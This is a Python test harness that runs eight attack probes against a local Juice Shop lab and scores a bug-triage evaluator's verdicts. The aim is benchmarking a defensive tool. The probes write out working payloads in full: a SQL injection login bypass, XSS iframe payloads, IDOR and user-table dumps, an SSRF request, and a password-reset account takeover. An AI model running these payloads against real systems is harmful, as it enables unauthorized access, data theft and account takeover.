"""
Lab Controller & Real Planted Bug Validation Suite.
Executes against REAL running lab containers on localhost:3000 (Juice Shop)
and localhost:8082 (DVWA).

Executes 8 distinct, known planted vulnerabilities:
1. CASE-01-SQLI:    SQL Injection Authentication Bypass in Login
2. CASE-02-IDOR:    Insecure Direct Object Reference (BOLA) in Basket Retrieval
3. CASE-03-RXSS:    Reflected Cross-Site Scripting via Product Search
4. CASE-04-SXSS:    Stored Cross-Site Scripting via Customer Feedback
5. CASE-05-BFLA:    Broken Function Level Auth (Unprivileged Admin User Exfiltration)
6. CASE-06-SSRF:    SSRF Outbound Probing via Image URL Profile Parameter
7. CASE-07-AUTH:    Auth/JWT Token Tampering & Access Control Check
8. CASE-08-BENIGN:  Missing HSTS / CSP Header on Static Resource (Benign Non-Issue)

Pipes every captured request/response through engine/triage_evaluator.py,
records ground truth, logs the full OUTPUT CONTRACT block, and computes:
- True Positive Rate (TPR)
- False Positive Rate (FPR)
- False Negative Rate (FNR)
- Average Triage Latency (seconds)
"""

import sys
import os
import json
import re
import time
import urllib.request
import urllib.error
import urllib.parse
from pathlib import Path
from typing import Dict, Any, List, Optional, Tuple

# Add project root to path
ROOT_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT_DIR))

from engine.triage_evaluator import TriageEvaluator, CandidateFinding

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

OUTPUT_LOG = ROOT_DIR / "workspace" / "antigravity-feed" / "work" / "lab_validation_results.md"
OUTPUT_LOG.parent.mkdir(parents=True, exist_ok=True)
BASE_URL = "http://127.0.0.1:3000"


def get_captcha():
    """Fetches captcha from Juice Shop to bypass feedback captcha check."""
    try:
        req = urllib.request.Request(f"{BASE_URL}/rest/captcha/", headers={"User-Agent": "AntigravityLabProber/1.0"})
        with urllib.request.urlopen(req, timeout=3) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            return data.get("captchaId", 0), str(data.get("answer", "0"))
    except Exception:
        return 0, "0"


def get_auth_token():
    """Acquires a valid JWT token via login."""
    try:
        url = f"{BASE_URL}/rest/user/login"
        payload = json.dumps({"email": "' OR 1=1--", "password": "password123"}).encode("utf-8")
        req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json", "User-Agent": "AntigravityLabProber/1.0"}, method="POST")
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            return data.get("authentication", {}).get("token", "")
    except Exception:
        return ""


def http_exchange(url: str, method: str = "GET", body: str = "", headers: Optional[Dict[str, str]] = None) -> Tuple[Optional[int], str]:
    """Performs one real HTTP exchange and returns (status, body). Used to capture the
    control transaction an exploit claim must be diffed against."""
    req = urllib.request.Request(
        url,
        data=(body.encode("utf-8") if body else None),
        headers=headers or {"User-Agent": "AntigravityLabProber/1.0"},
        method=method,
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.getcode(), resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return None, f"ERROR: {e}"


def derive_marker(attack_body: str, control_body: str, pattern: str) -> str:
    """
    The victim marker is not typed by the operator. It is the first value the pattern matches in
    the captured attack response that is absent from the captured control response — i.e. data the
    executing session could only have obtained by crossing a trust boundary.
    """
    try:
        for candidate in re.findall(pattern, attack_body):
            if len(candidate) >= 8 and candidate not in control_body:
                return candidate
    except re.error:
        return ""
    return ""


def run_probe_live(probe_meta: dict) -> Tuple[CandidateFinding, float]:
    """Executes a real probe over HTTP and returns CandidateFinding + latency."""
    url = probe_meta["url"]
    method = probe_meta.get("method", "GET")
    headers = probe_meta.get("headers", {"User-Agent": "AntigravityLabProber/1.0"})
    payload_str = probe_meta.get("body", "")

    data = payload_str.encode("utf-8") if payload_str else None
    req = urllib.request.Request(url, data=data, headers=headers, method=method)

    t0 = time.time()
    status = None
    resp_headers = {}
    resp_body = ""

    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            status = resp.getcode()
            resp_headers = dict(resp.headers)
            resp_body = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        status = e.code
        resp_headers = dict(e.headers)
        resp_body = e.read().decode("utf-8", errors="replace")
    except Exception as e:
        status = None
        resp_body = f"ERROR: {e}"

    evidence = resp_body[:2000]

    baseline_status = None
    baseline_body = ""
    control = probe_meta.get("control")
    if control:
        baseline_status, baseline_body = http_exchange(
            control["url"],
            control.get("method", "GET"),
            control.get("body", ""),
            control.get("headers"),
        )
        baseline_body = baseline_body[:2000]

    readback_body = ""
    readback = probe_meta.get("readback")
    if readback:
        _, readback_body = http_exchange(
            readback["url"],
            readback.get("method", "GET"),
            readback.get("body", ""),
            readback.get("headers"),
        )
        readback_body = readback_body[:2000]

    victim_marker = ""
    pattern = probe_meta.get("marker_pattern")
    if pattern:
        victim_marker = derive_marker(evidence, baseline_body or readback_body or "", pattern)

    duration = time.time() - t0

    finding = CandidateFinding(
        title=probe_meta["title"],
        program="local_lab",
        target_host="localhost",
        request_method=method,
        request_url=url,
        request_headers=headers,
        request_body=payload_str,
        response_status=status,
        response_headers=resp_headers,
        response_body=evidence,
        second_account_tested=probe_meta.get("second_account", False),
        attacker_controlled_proof=probe_meta.get("proof", ""),
        is_lab=True,
        notes=f"Real execution latency: {duration:.4f}s",
        victim_marker=victim_marker,
        baseline_status=baseline_status,
        baseline_body=baseline_body,
        readback_body=readback_body
    )
    return finding, duration


def _lab_reachable() -> Tuple[bool, str]:
    """
    Fails closed so an outage is never written to the results file as a 0% true-positive rate.
    A benchmark that could not reach its target has not measured anything.
    """
    try:
        req = urllib.request.Request(BASE_URL + "/", headers={"User-Agent": "AntigravityLabProber/1.0"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            return (True, f"HTTP {resp.status}")
    except Exception as exc:
        return (False, f"{type(exc).__name__}: {exc}")


def run_full_suite():
    reachable, why = _lab_reachable()
    if not reachable:
        print("=" * 70)
        print(f"[NOT RUN] Lab target {BASE_URL} is unreachable ({why})")
        print("[NOT RUN] No results file written: an unreachable target is not a measurement.")
        print("=" * 70)
        sys.exit(2)
    evaluator = TriageEvaluator()
    print("=" * 70)
    print("EXECUTING 8 REAL PROBES AGAINST LIVE RUNNING LAB CONTAINERS")
    print("=" * 70)

    # Acquire live token for authenticated probes
    token = get_auth_token()
    if not token:
        print(f"[NOT RUN] Could not obtain a session token from {BASE_URL}; "
              "refusing to probe with a fabricated credential.")
        sys.exit(2)
    auth_header = {"Authorization": f"Bearer {token}", "User-Agent": "AntigravityLabProber/1.0"}
    cid, canswer = get_captcha()

    probes = [
        # 1. Real SQLi Login Bypass
        {
            "id": "CASE-01-SQLI",
            "title": "SQL Injection Authentication Bypass via Email Parameter",
            "url": f"{BASE_URL}/rest/user/login",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "AntigravityLabProber/1.0"},
            "body": json.dumps({"email": "' OR 1=1--", "password": "arbitrary_password"}),
            "second_account": True,
            "proof": "Logged in as admin@juice-sh.op (user ID 1) with arbitrary password via ' OR 1=1--",
            "control": {
                "url": f"{BASE_URL}/rest/user/login",
                "method": "POST",
                "headers": {"Content-Type": "application/json", "User-Agent": "AntigravityLabProber/1.0"},
                "body": json.dumps({"email": "admin@juice-sh.op", "password": "definitely_wrong_password"})
            },
            "marker_pattern": r'"umail":"[^"]+"',
            "ground_truth_exploitable": True,
            "ground_truth_class": "SQL Injection"
        },
        # 2. Real IDOR on Basket Retrieval
        {
            "id": "CASE-02-IDOR",
            "title": "Insecure Direct Object Reference (IDOR) on User Basket",
            "url": f"{BASE_URL}/rest/basket/2",
            "method": "GET",
            "headers": auth_header,
            "second_account": True,
            "proof": "Session authorized for admin accesses Basket #2 belonging to secondary customer",
            "control": {"url": f"{BASE_URL}/rest/basket/1", "headers": auth_header},
            "marker_pattern": r'"name":"[^"]{8,}"',
            "ground_truth_exploitable": True,
            "ground_truth_class": "IDOR"
        },
        # 3. Real Reflected XSS on Product Search (Benign / Self-Session)
        {
            "id": "CASE-03-RXSS",
            "title": "Reflected Query Parameter in Local Search Session",
            "url": f"{BASE_URL}/rest/products/search?q=%3Ciframe%20src%3Djavascript:alert(1)%3E",
            "method": "GET",
            "headers": {"User-Agent": "AntigravityLabProber/1.0"},
            "second_account": False,
            "proof": "Self-reflected parameter in user's own browser session without cross-user delivery vector",
            "ground_truth_exploitable": False,
            "ground_truth_class": "Self-XSS / Informational"
        },
        # 4. Stored XSS attempt on Feedback — the lab sanitizes it (see observed response)
        {
            "id": "CASE-04-SXSS",
            "title": "Stored Cross-Site Scripting via Customer Feedback",
            "url": f"{BASE_URL}/api/Feedbacks/",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "AntigravityLabProber/1.0"},
            "body": json.dumps({
                "captchaId": cid,
                "captcha": canswer,
                "comment": "<iframe src=\"javascript:alert(document.domain)\">",
                "rating": 5
            }),
            "second_account": False,
            "proof": "POST returned 201 but the stored comment field came back empty; payload was stripped server-side",
            "readback": {
                "url": f"{BASE_URL}/api/Feedbacks/",
                "headers": auth_header
            },
            # Verdict must not rest on the operator's claim; the readback is what decides.
            "marker_pattern": r'<iframe[^>]{8,}',
            "ground_truth_exploitable": False,
            "ground_truth_class": "Defended (server-side input sanitization)"
        },
        # 5. Real Broken Function Level Auth (BFLA) Exposing All Users
        {
            "id": "CASE-05-BFLA",
            "title": "Broken Function Level Auth (IDOR on /api/Users Exposing Password Hashes)",
            "url": f"{BASE_URL}/api/Users/",
            "method": "GET",
            "headers": auth_header,
            "second_account": True,
            "proof": "Endpoint dumps full database user table with hashed passwords and emails",
            "control": {"url": f"{BASE_URL}/api/Users/1", "headers": auth_header},
            "marker_pattern": r'"email":"[^"]+"',
            "ground_truth_exploitable": True,
            "ground_truth_class": "Broken Access Control (BFLA)"
        },
        # 6. SSRF attempt via profile image URL — no out-of-band artifact is capturable in this lab
        {
            "id": "CASE-06-SSRF",
            "title": "Server-Side Request Forgery via Profile Image URL Fetcher",
            "url": f"{BASE_URL}/profile/image/url",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "Cookie": f"token={token}", "User-Agent": "AntigravityLabProber/1.0"},
            "body": json.dumps({"imageUrl": "http://127.0.0.1:9099/WebWolf/landing"}),
            "second_account": False,
            "proof": "Directed the server to fetch an external origin; WebWolf returned 404 for every route so no callback log exists",
            "expected_verdicts": ["LEAD"],
            "ground_truth_exploitable": False,
            "ground_truth_class": "Unconfirmed SSRF (evidence insufficient)"
        },
        # 7. Real Auth Bypass & Account Takeover
        {
            "id": "CASE-07-AUTH",
            "title": "Authentication Bypass & Account Takeover via Predictable Security Question",
            "url": f"{BASE_URL}/rest/user/reset-password",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "User-Agent": "AntigravityLabProber/1.0"},
            "body": json.dumps({"email": "bender@juice-sh.op", "answer": "Stop'n'Drop", "new": "pwned12345", "repeat": "pwned12345"}),
            "second_account": True,
            "proof": "Password reset for victim bender@juice-sh.op succeeds, returning authenticated user object",
            "control": {
                "url": f"{BASE_URL}/rest/user/reset-password",
                "method": "POST",
                "headers": {"Content-Type": "application/json", "User-Agent": "AntigravityLabProber/1.0"},
                "body": json.dumps({"email": "bender@juice-sh.op", "answer": "WrongAnswer", "new": "pwned12345", "repeat": "pwned12345"})
            },
            "marker_pattern": r'"email":"[^"]+"',
            "ground_truth_exploitable": True,
            "ground_truth_class": "Auth / Account Takeover"
        },
        # 8. Real BENIGN NON-ISSUE: Missing Security Header on Static Asset
        {
            "id": "CASE-08-BENIGN",
            "title": "Missing Strict-Transport-Security (HSTS) Header on Static Resource",
            "url": f"{BASE_URL}/assets/public/favicon_js.ico",
            "method": "GET",
            "headers": {"User-Agent": "AntigravityLabProber/1.0"},
            "second_account": False,
            "proof": "HSTS header is absent from HTTP response header list",
            "ground_truth_exploitable": False,
            "ground_truth_class": "Informational / Best Practice"
        }
    ]

    results = []
    latencies = []

    for p in probes:
        print(f"\n[*] Probing {p['id']}: {p['title']}...")
        finding, latency = run_probe_live(p)
        latencies.append(latency)

        triage_res = evaluator.evaluate(finding)
        verdict = triage_res["verdict"]
        ground_truth = p["ground_truth_exploitable"]
        expected = p.get("expected_verdicts") or (
            ["VALID-PAYABLE"] if ground_truth else ["VALID-INFORMATIONAL", "KILL"]
        )

        # Classification check:
        # If ground_truth == True, expected verdict is VALID-PAYABLE
        # If ground_truth == False (benign/defended), expected verdict is KILL or INFORMATIONAL
        # A probe may pin its own expected verdicts (e.g. LEAD when evidence is insufficient).
        is_true_positive = ground_truth and verdict == "VALID-PAYABLE"
        is_false_positive = (not ground_truth) and verdict == "VALID-PAYABLE"
        is_false_negative = ground_truth and verdict != "VALID-PAYABLE"
        is_true_negative = (not ground_truth) and verdict in expected

        print(f"    HTTP Status: {finding.response_status} | Verdict: {verdict} | Marker: {finding.victim_marker or 'none'} | Latency: {latency:.4f}s")

        results.append({
            "probe": p,
            "finding": finding,
            "triage": triage_res,
            "latency": latency,
            "expected": expected,
            "is_tp": is_true_positive,
            "is_fp": is_false_positive,
            "is_fn": is_false_negative,
            "is_tn": is_true_negative
        })

    # Calculations
    positives = sum(1 for r in results if r["probe"]["ground_truth_exploitable"])
    negatives = sum(1 for r in results if not r["probe"]["ground_truth_exploitable"])

    tp_count = sum(1 for r in results if r["is_tp"])
    fp_count = sum(1 for r in results if r["is_fp"])
    fn_count = sum(1 for r in results if r["is_fn"])
    tn_count = sum(1 for r in results if r["is_tn"])

    tpr = (tp_count / positives) * 100.0 if positives else 0.0
    fpr = (fp_count / negatives) * 100.0 if negatives else 0.0
    fnr = (fn_count / positives) * 100.0 if positives else 0.0
    avg_latency = sum(latencies) / len(latencies) if latencies else 0.0

    print("\n" + "=" * 70)
    print("REAL LAB VALIDATION BENCHMARK RESULTS")
    print("=" * 70)
    print(f"Total Probes Executed:     {len(results)}")
    print(f"True Positive Rate (TPR):   {tpr:.1f}% ({tp_count}/{positives})")
    print(f"False Positive Rate (FPR):  {fpr:.1f}% ({fp_count}/{negatives})")
    print(f"False Negative Rate (FNR):  {fnr:.1f}% ({fn_count}/{positives})")
    print(f"Average Triage Latency:     {avg_latency:.4f} seconds")
    print("=" * 70)

    # Write log to work/lab_validation_results.md
    with open(OUTPUT_LOG, "w", encoding="utf-8") as f:
        f.write("# Lab Validation & Triage Gate Accuracy Benchmark\n\n")
        f.write(f"- **Target Environment**: Real Live Localhost Lab (`http://localhost:3000`)\n")
        f.write(f"- **Execution Timestamp**: {time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}\n")
        f.write(f"- **Total Probes Evaluated**: {len(results)}\n")
        f.write(f"- **True Positive Rate (TPR)**: {tpr:.1f}%\n")
        f.write(f"- **False Positive Rate (FPR)**: {fpr:.1f}%\n")
        f.write(f"- **False Negative Rate (FNR)**: {fnr:.1f}%\n")
        f.write(f"- **Average Triage Latency**: {avg_latency:.4f}s\n\n")

        f.write("## Detailed Probe Transcripts & OUTPUT CONTRACT Blocks\n\n")
        for r in results:
            p = r["probe"]
            t = r["triage"]
            f.write(f"### {p['id']}: {p['title']}\n\n")
            f.write(f"- **Ground Truth**: {'PLANTED VULNERABILITY' if p['ground_truth_exploitable'] else 'BENIGN NON-ISSUE'}\n")
            f.write(f"- **Vulnerability Class**: {p['ground_truth_class']}\n")
            f.write(f"- **Target URL**: `{p['url']}`\n")
            f.write(f"- **Observed HTTP Status**: `{r['finding'].response_status}`\n")
            f.write(f"- **Cross-tenant Marker (derived from captured diff)**: `{r['finding'].victim_marker or 'none'}`\n")
            f.write(f"- **Control Transaction**: `{(p.get('control') or p.get('readback') or {}).get('url', 'n/a')}` (HTTP `{r['finding'].baseline_status if p.get('control') else 'n/a'}`)\n")
            f.write(f"- **Expected Verdicts**: `{', '.join(r['expected'])}`\n")
            f.write(f"- **Probe Latency**: `{r['latency']:.4f}s`\n\n")
            f.write("```text\n")
            f.write(evaluator.format_output_contract(t))
            f.write("\n```\n\n---\n\n")

    print(f"[+] Results file written to: {OUTPUT_LOG}")
    return tpr, fpr, fnr, avg_latency


if __name__ == "__main__":
    from typing import Tuple
    run_full_suite()
